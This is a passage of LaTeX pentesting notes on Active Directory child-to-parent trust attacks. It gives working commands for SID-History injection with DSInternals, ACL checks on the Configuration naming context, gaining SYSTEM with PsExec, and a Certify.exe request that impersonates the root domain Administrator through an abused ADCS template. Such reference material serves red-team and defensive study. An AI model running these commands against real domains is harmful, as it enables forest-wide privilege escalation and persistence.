\section{Child - Parent trust Attack}

\subsubsection{Unconstrained delegation}


\subsection{SID-History Modification (T1134.005)}
\label{mitre:t1134.005}


modify SID History of an account~\url{https://www.thehacker.recipes/a-d/persistence/sid-history}

\begin{verbatim}
# Install DSInternals on the domain controller
Install-Module -Name DSInternals

# Find the account SID you want to inject
Get-ADUser -Identity $InterestingUser

# Stop the NTDS service
Stop-service NTDS -force

# Inject the SID into the SID History attribute
Add-ADDBSidHistory -samaccountname AttackerUser -sidhistory $SIDOfInterestingUser -DBPath C:\Windows\ntds\ntds.dit

# Start the NTDS service
Start-service NTDS
\end{verbatim}

\subsection{Golden Ticket with ExtraSID Attack}
see~\ref{kerberos:golden-extra-sid-ticket}

\subsection{Trust ticket - forge inter-realm TGT}
See~\ref{kerberos:trust_inter_realm}



\subsection{Configuration Naming Context (NC) Replication Abuse}
exploit the replication mechanism of the Configuration Naming Context in Active Directory to propagate unauthorized changes or configurations across the domain infrastructure. By leveraging this method, attackers can potentially introduce backdoors, escalate privileges, or manipulate critical settings, thereby compromising the security and integrity of the entire Active Directory environment.

\begin{verbatim}
    $dn = "CN=Configuration,DC=<root_domain_name>,DC=<tld>"
    $acl = Get-Acl -Path "AD:\$dn"
    $acl.Access | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|Write" }
\end{verbatim}

That shows that \verb+NT AUTHORITY\SYSTEM+ has \verb+GenericAll+ on the container. So beeing \verb+NT AUTHORITY\SYSTEM+ (\verb+.\PsExec -s -i powershell+) on a DC in the forest will allow to operate modification on the whole forest.


\subsubsection{ADCS}
Create a vulnerable template from child domain (set ACL to grant \verb+GenericAll+ to compromised domain admin) and publish it to an CA, then request a certificate as an enterprise admin user (administrator of the root domain).

\begin{verbatim}
    Certify.exe request `
        /ca:<ca> /domain:<root_domain_fqdn> `
        /template:"<vuln_template_name>" `
        /altname:<root_domain_netbios>\Administrator
\end{verbatim}


By default ACL allow to create template but does not allow to publish them on a CA. But  \verb+NT AUTHORITY\SYSTEM+ has a \verb+GenericAll+ on \verb+CN=Public Key Services,CN=Services,CN=Configuration,DC=<root_domain_name>,DC=<tld>+ that does not propagate. The only action that need to be performed is to allow propagation.
\begin{verbatim}
    $dn  = "CN=Public Key Services,CN=Services,CN=Configuration,DC=<root_domain_name>,DC=<tld>"
    PS C:\Users\Administrator> $acl = Get-Acl -Path "AD:\$dn"
    PS C:\Users\Administrator> $acl.Access | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|Write" }
\end{verbatim}

\subsubsection{GPO on site}
\subsubsection{Golden GMSA trust attack}
\subsubsection{DNS}



\subsection{Schema change trust attack}
